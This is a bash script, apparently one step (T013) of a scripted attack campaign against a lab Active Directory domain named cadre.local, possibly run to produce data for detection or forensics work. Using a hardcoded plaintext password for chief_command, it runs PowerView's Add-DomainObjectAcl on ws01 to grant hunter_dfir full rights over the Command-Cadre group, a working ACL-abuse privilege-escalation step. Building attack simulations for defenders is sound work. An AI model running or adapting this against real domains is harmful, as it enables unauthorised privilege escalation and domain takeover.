#!/usr/bin/env bash
# T013 — ACL WriteDacl from ws01 as chief_command (cadre.local DA)
# Uses PowerView.ps1 to grant hunter_dfir GenericAll on Command-Cadre group.
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword on chief_command)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T013-WRITEDACL-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T013 WriteDacl | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
PRINCIPAL="${PRINCIPAL:-hunter_dfir}"
TARGET_DN="CN=Command-Cadre,OU=Command,DC=cadre,DC=local"

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_ROOT}\${PRINCIPAL}"'''";
$dn = "'''"${TARGET_DN}"'''";
Add-DomainObjectAcl -Identity $dn -PrincipalIdentity $u -Rights All -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
Write-Output "T013_OK: granted GenericAll/WriteDacl to $u on $dn"
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T013 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T013 run complete ==="
